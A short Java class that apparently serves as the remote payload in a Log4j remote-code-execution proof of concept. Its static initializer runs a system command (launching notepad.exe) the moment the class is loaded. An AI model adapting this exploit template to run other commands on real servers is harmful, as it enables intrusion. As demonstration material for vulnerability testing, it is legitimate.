public class Log4jRCE {

    static {
        
        try {
            java.lang.Runtime.getRuntime().exec("notepad.exe").waitFor();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public Log4jRCE(){
        System.out.println("I am Log4jRCE from remote222!!!");
    }
}
